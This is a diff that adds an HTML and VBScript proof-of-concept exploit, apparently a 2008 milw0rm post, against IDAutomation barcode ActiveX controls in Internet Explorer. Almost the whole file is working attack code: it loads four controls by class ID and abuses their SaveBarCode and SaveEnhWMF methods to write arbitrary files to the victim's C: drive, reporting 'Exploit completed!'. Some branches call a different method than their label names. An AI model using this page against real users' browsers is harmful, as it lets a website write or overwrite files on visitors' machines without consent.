@@ -1,0 +1,69 @@
+-----------------------------------------------------------------------------
+ IDAutomation Multiple Vulnerabilities
+ url: www.idautomation.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+
+ In memory of rgod
+-----------------------------------------------------------------------------
+<b>IDAutomation Linear BarCode:</b> 		<object classid='clsid:0C3874AA-AB39-4B5E-A768-45F3CE6C6819' id='IDLinear'></object>
+<b>IDautomation Datamatrix Barcode:</b>	<object classid='clsid:DB67DB99-616A-4CAB-A3A1-2EF644F254E7' id='IDDataMatrix'></object>
+<b>IDautomation PDF417 Barcode:</b>		<object classid='clsid:E97EE6EB-7FBE-43B1-B6D8-C4D86C78C5A0' id='IDPDF'></object>
+<b>IDautomation Aztec Barcode:</b>		<object classid='clsid:eba15b30-80b4-11dc-b31d-0050c2490048' id='IDAztec'></object>
+-----------------------------------------------------------------------------
+
+<select style="width: 404px" name="IDAuto">
+  <option value = "IDLinearOpt">IDAutomation Linear BarCode</option>
+  <option value = "IDDataMatrixOpt">IDautomation Datamatrix Barcode</option>
+  <option value = "IDPDFOpt">IDautomation PDF417 Barcode</option>
+  <option value = "IDAztecOpt">IDautomation Aztec Barcode</option>
+</select>
+
+<select style="width: 404px" name="IDMethods">
+  <option value = "SaveBarCode">SaveBarCode</option>
+  <option value = "SaveEnhWMF">SaveEnhWMF</option>
+</select>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+
+<script language='vbscript'>
+ Sub tryMe
+  On Error Resume Next
+   If IDAuto.value="IDLinearOpt" And IDMethods.Value = "SaveBarCode" Then
+    IDLinear.SaveBarCode "C:\IDLinearSaveBarCode.txt"
+    MsgBox "Exploit completed!"
+   ElseIf IDAuto.value="IDLinearOpt" And IDMethods.Value = "SaveEnhWMF" Then
+    IDLinear.SaveBarCode "C:\IDLinearSaveEnhWMF.txt"
+    MsgBox "Exploit completed!"
+   ElseIf IDAuto.value="IDDataMatrixOpt" And IDMethods.Value = "SaveBarCode" Then
+    IDDataMatrix.SaveBarCode "C:\IDDataMatrixSaveBarCode.txt"
+    MsgBox "Exploit completed!"
+   ElseIf IDAuto.value="IDDataMatrixOpt" And IDMethods.Value = "SaveEnhWMF" Then
+    IDDataMatrix.SaveBarCode "C:\IDDataMatrixSaveEnhWMF.txt"
+    MsgBox "Exploit completed!"
+   ElseIf IDAuto.value="IDPDFOpt" And IDMethods.Value = "SaveBarCode" Then
+    IDPDF.SaveBarCode "C:\IDPDFSaveBarCode.txt"
+    MsgBox "Exploit completed!"
+   ElseIf IDAuto.value="IDPDFOpt" And IDMethods.Value = "SaveEnhWMF" Then
+    IDPDF.SaveEnhWMF "C:\IDPDFSaveEnhWMF.txt"
+    MsgBox "Exploit completed!"
+   ElseIf IDAuto.value="IDAztecOpt" And IDMethods.Value = "SaveBarCode" Then
+    IDAztec.SaveBarCode "C:\IDAztecSaveBarCode.txt"
+    MsgBox "Exploit completed!"
+   ElseIf IDAuto.value="IDAztecOpt" And IDMethods.Value = "SaveEnhWMF" Then
+    IDAztec.SaveEnhWMF "C:\IDAztecSaveEnhWMF.txt"
+    MsgBox "Exploit completed!"
+   Else
+    MsgBox "Be safe..."
+   End if
+ End Sub
+</script>
+
+# milw0rm.com [2008-05-14]
